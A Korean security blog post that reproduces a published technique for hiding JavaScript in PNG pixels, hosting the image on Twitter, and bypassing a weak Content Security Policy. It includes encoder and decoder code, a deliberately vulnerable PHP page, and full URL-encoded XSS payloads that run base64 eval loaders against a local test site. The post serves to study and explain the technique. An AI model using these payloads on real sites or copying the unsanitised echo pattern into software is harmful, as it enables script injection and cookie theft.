---
layout: post
title:  "Hide JavaScript Code in PNG"
author: "gurumi907"
comments: true
tags: [web]
---

라온화이트햇 핵심연구팀 조운삼

얼마전 CSP를 우회하여 PNG 이미지에 Javascript를 숨길수 있다는 글을 보았고, 해당 내용의 이론적인 부분 번역하며 따라해본 내용을 정리해보려고 합니다.

해당 게시글에서는 HTML Canvas를 사용하면 Javascript 코드를 PNG 이미지 속에 픽셀로 변환하여 숨길수 있다고 합니다.

문서에 따르면 CanvasRenderingContext2D의 `putImageData` 와 `getImageData`, 그리고 `String.charCodeAt` 메소드의 사용으로 PNG 이미지 속에 숨겨진 문자열을 조합할 수 있습니다.

---

## Test "Hello, World!"

```jsx
(function() {
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    var stringenc = "Hello, World!";
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();
```

위 코드는 `stringenc` 에 입력한 문자열을 각 이미지 픽셀의 R,G,B 으로 입력하여 `putImageData` 를 사용하여 이미지를 만드는 코드 입니다.

![/assets/2020-10-01/hide_js.png](/assets/2020-10-01/hide_js.png)

위 `javascript` 코드를 브라우저 `script console` 에 입력하면 위 그림과 같은 화면이 나타납니다. 각 픽셀의 R,G,B에는 `stringenc` 의 1자씩 들어가게 되어 3개의 글자가 1개의 픽셀을 이루고 있습니다.

![/assets/2020-10-01/hide_js1.png](/assets/2020-10-01/hide_js1.png)

위 그림은 `stringenc` 을 이미지화하는 과정을 담은 그림입니다.

```jsx
t = document.getElementsByTagName("img")[0];
var s = String.fromCharCode, c = document.createElement("canvas");
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth,
    h = t.offsetHeight;*
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
cx.drawImage(t, 0, 0);
var x = cx.getImageData(0, 0, w, h).data;
var a = "",
    l = x.length,
    p = -1;
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]);
    if (x[i + 1]) a += s(x[i + 1]);
    if (x[i + 2]) a += s(x[i + 2]);
}
console.log(a);
document.getElementsByTagName("body")[0].innerHTML=a;
```

![/assets/2020-10-01/hide_js2.png](/assets/2020-10-01/hide_js2.png)

위 코드는 보이듯이 `getImageData` 를 사용하여 이미지 속에 감춰진 문자열을 뽑아내어 복원한는 과정입니다. `getImageData` 를 사용하게 되면 이미지에 대한 data는 배열의 형태로 반환되어집니다. 그 과정에서 얻어지는 배열의 순서는 다음과 같습니다. `[pixel 1R, pixel 1G, pixel 1B, pixel 1Alpah, ..., pixelNR, pixelNG, pixelNB, pixelNAlpha]`

---

## 취약 웹사이트 예시

```php
<?php
	header("Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' https://pbs.twimg.com")
?>
<html>
<body>
    <img src="<?php echo $_GET["lang"] ?>/flag.png"?
</body>
</html>
```

위 사이트는 직접 로드한 JS코드만 허용, Twitter에서 원격으로 가져오는 이미지를 허용하는 CSP를 적용하고 있습니다. 

lang 파라미터를 통해 표시할 이미지의 주소를 가져오도록하는 간단한 웹 사이트 예시입니다. 

---

## Twitter에 이미지 게시

앞서 진행한 테스트에서 만든 이미지는 크기가 너무 작아 Twitter에 게시되지 않습니다.  따라서, 아래와 같이 이미지 크기를 크게 만들어서 게시해주도록 합니다.

```jsx
(function() {
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    var stringenc = "function asd() {\
        var d = document;\
        var c = 'cookie';\
        alert(d[c]);\
    };asd();/*Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam aliquam blandit metus vel elementum. Mauris mi tortor, congue eget fringilla id, tempus a tellus. Morbi laoreet vitae ipsum vel dapibus. Nunc eu faucibus ligula. Donec maximus malesuada justo. Nulla congue, risus quis dapibus porttitor, metus quam rutrum dolor, ac maximus nibh metus quis enim. Aenean hendrerit venenatis massa ac gravida. Donec at nisi quis ex sollicitudin bibendum sit amet ac quam.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Vestibulum tincidunt diam vel diam semper posuere. Nulla facilisi. Curabitur a facilisis lorem, eu porta leo. Sed pharetra eros et malesuada mattis. Donec tincidunt elementum mauris quis commodo. Donec nec vulputate nulla. Nunc luctus orci lacinia nunc sodales, vitae cursus quam tempor. Cras ullamcorper ullamcorper urna vitae pulvinar. Curabitur ac pretium felis. Vivamus vel scelerisque nisi. Pellentesque lacinia consequat nibh, vitae rhoncus tellus faucibus eget. Ut pulvinar est non tellus tristique sodales. Aenean eget velit non turpis tristique pretium id eu dolor. Nulla sed eros quis urna facilisis scelerisque. Nam orci neque, finibus eget odio et, elementum finibus erat.*/";
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();
```

[https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&name=120x120](https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&name=120x120)

[`https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&name=120x120`](https://pbs.twimg.com/media/EXUmOTmUcAAHGtS?format=png&name=120x120)

![/assets/2020-10-01/hide_js3.png](/assets/2020-10-01/hide_js3.png)

이미지에서 문자열을 추출하였을 때 원래 작성한 JS코드가 확인됩니다.

---

## Exploit

CSP를 우회하기 위해서 기존에 이미지에서 문자열을 뽑아내는 Javascript 코드를 일부 수정해야합니다.

```jsx
t = document.getElementById("jsimg");
var s = **String.fromCharCode, c = document.createElement("canvas");**
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth,
    h = t.offsetHeight;
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
cx.drawImage(t, 0, 0);
var x = cx.getImageData(0, 0, w, h).data;
var a = "",
    l = x.length,
    p = -1;
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]);
    if (x[i + 1]) a += s(x[i + 1]);
    if (x[i + 2]) a += s(x[i + 2]);
}
eval(a)
```

위 코드를 base64로 인코딩 후, 테스트 웹 사이트에서 동작할 수 있도록 적절한 구문을 작성합니다.

```
Image src : https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FEXUmOTmUcAAHGtS%3Fformat%3Dpng%26name%3D120x120%22

Javascript Code : onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27

http://localhost/test.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FEXUmOTmUcAAHGtS%3Fformat%3Dpng%26name%3D120x120%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22
```

파란색 부분은 img 태그의 src 속성에 들어갈 Twitter의 이미지 주소, 빨간색 부분은 base64로 인코딩된 이미지에서 JS 코드를 추출하여 실행하는 코드입니다.

![/assets/2020-10-01/hide_js4.png](/assets/2020-10-01/hide_js4.png)

cross-origin 에러가 발생합니다.

> HTML은 이미지에 crossorigin 속성을 제공하는데, 이 속성은 이미지를 `img` 태그를 사용하여 외부의 이미지를 `<canvas>` 를 사용하여 정의할 수 있도록 합니다.

```
crossorigin=%22anonymous%22

http://localhost/test.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FEXUmOTmUcAAHGtS%3Fformat%3Dpng%26name%3D120x120%22+crossorigin=%22anonymous%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22
```

보라색의 코드를 추가로 넣어서 진행할 경우

![/assets/2020-10-01/hide_js5.png](/assets/2020-10-01/hide_js5.png)

별도의 error 없이 JavaScript 코드가 실행됨을 확인 할 수 있습니다.

---

## 마치며

해당 문서에서 기술한 내용은 CSP의 정책이 강력하지 않고, Twitter에 업로드된 이미지에 대해 와일드 카드 액세스 response header를 사용하기 때문에 가능하다고 합니다. 

해외 블로그에 개제된 내용을 번역하여 실제 따라해본 과정을 담고 있습니다.

---

## 참고

- [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)
- [https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350](https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350)